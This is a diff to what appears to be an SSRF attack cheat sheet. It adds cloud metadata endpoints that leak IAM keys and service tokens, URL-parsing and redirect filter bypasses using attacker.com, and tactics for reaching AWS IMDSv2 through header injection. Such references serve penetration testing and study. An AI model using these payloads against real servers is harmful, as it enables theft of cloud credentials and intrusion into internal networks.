@@ -39,10 +39,12 @@ convert(
 ### Cloud Metadata Endpoints (critical)
 | Cloud | URL | What leaks |
 |---|---|---|
-| AWS | `http://169.254.169.254/latest/meta-data/` | Temporary IAM credentials |
-| AWS | `http://169.254.169.254/latest/meta-data/iam/security-credentials/` | Access Key + Secret |
-| GCP | `http://metadata.google.internal/computeMetadata/v1/` | Service Account tokens |
-| Azure | `http://169.254.169.254/metadata/instance` | Managed Identity tokens |
+| AWS (v1) | `http://169.254.169.254/latest/meta-data/` | IAM credentials, keys |
+| AWS (v2) | `X-aws-ec2-metadata-token-ttl-seconds: 21600` | Requires header injection |
+| GCP | `http://metadata.google.internal/computeMetadata/v1/` | Requires `Metadata-Flavor: Google` |
+| Azure | `http://169.254.169.254/metadata/instance` | Requires `Metadata: true` |
+| DigitalOcean | `http://169.254.169.254/metadata/v1.json` | Internal data |
+| Oracle | `http://192.0.0.192/opc/v1/instance/` | Instance metadata |
 
 ### Internal Network
 ```
@@ -87,7 +89,10 @@ http://customer.internal.attacker.com/   controlled DNS  internal IP
 ### Redirect Bypass
 ```
 http://attacker.com/redirect?to=http://169.254.169.254/
-# Server validates attacker.com but follows the redirect to the blocked IP
+# Special bypass for hardened filters:
+http://trusted.com@attacker.com/bypass
+http://127.0.0.1#@trusted.com
+http://127.0.0.1:80?@trusted.com
 ```
 
 ### DNS Rebinding
@@ -96,6 +101,16 @@ http://attacker.com/redirect?to=http://169.254.169.254/
 2. After validation, TTL expires and domain starts resolving to internal IP
 3. Second request goes to the blocked internal IP
 ```
+
+---
+
+## 💣 IMDSv2 Bypass (The Header Injection Challenge)
+
+Cloud modern environments (AWS) require a token fetched via a PUT request. Standard SSRF only allows GET/POST.
+**Advanced Tactic:** 
+1. Look for **HTTP Header Injection** in internal proxies.
+2. If you can inject `X-aws-ec2-metadata-token: [CapturedToken]`, you can access IMDSv2.
+3. Check for **Internal Application Proxies** (like a `service mesh` or `reverse proxy`) that might be configured to automatically add these headers or allow them to be passed through.
 
 ---
 
